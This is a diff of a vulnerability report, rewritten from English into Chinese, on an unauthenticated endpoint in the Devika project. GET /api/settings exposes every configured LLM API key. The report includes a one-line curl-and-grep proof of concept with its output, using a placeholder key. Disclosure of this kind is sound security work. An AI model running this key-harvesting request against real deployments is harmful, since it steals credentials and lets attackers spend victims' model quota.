@@ -1,26 +1,26 @@
-# F-H-SETTINGS-2: Unauthenticated API keys disclosure
+# Devika：未认证读取全部 LLM API 密钥（GET /api/settings）
 
-**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
+## 描述
 
-## Description
-`GET /api/settings` in `devika.py:197-199` returns the entire configuration including all `API_KEYS` fields verbatim.
+`GET /api/settings`（devika.py:195-199）把 `config.toml` 的完整配置原样返回，包括 `API_KEYS` 段落中已配置的所有真实密钥（CLAUDE/GEMINI/OPENAI/BING 等）。接口无任何认证。
 
-## Impact
-Unauthenticated remote client obtains all LLM API keys (Claude, Gemini, OpenAI, etc.) in one request.
+## 影响
+
+任何能访问 1337 端口的网络客户端用一个 GET 拿到服务器上配置的全部 LLM API 密钥——直接的经济与数据损失（攻击者可用这些 key 消费配额、访问受害者的模型账户）。
 
 ## PoC
-```bash
-# No authentication required:
-curl http://<host>:1337/api/settings
 
-# In a real deployment with configured keys, the response contains:
-# {"settings":{"API_KEYS":{"CLAUDE":"sk-ant-api03-...",
-#   "GEMINI":"AIzaSy...","OPENAI":"sk-proj-..."},
-#   "API_ENDPOINTS":{...},"STORAGE":{...}}}
+```bash
+# 1. 前提：config.toml 中已配置任意密钥（模拟真实部署）
+#    [API_KEYS] 段 CLAUDE = "sk-ant-REPRO-FAKE-KEY-9d8e"
+# 2. 启动 devika 后，无凭据读取：
+curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-[A-Z0-9-]*'
 ```
 
-## Execution result
-```json
-{"settings":{"API_KEYS":{"BING":"<...>","CLAUDE":"<...>","GEMINI":"<...>",
-  "GOOGLE_SEARCH":"<...>"},"API_ENDPOINTS":{...},"STORAGE":{...}}}
+## 执行结果
+
+```
+$ curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-REPRO-FAKE-KEY-9d8e'
+sk-ant-REPRO-FAKE-KEY-9d8e
+[F02] API key disclosed unauth: YES
 ```
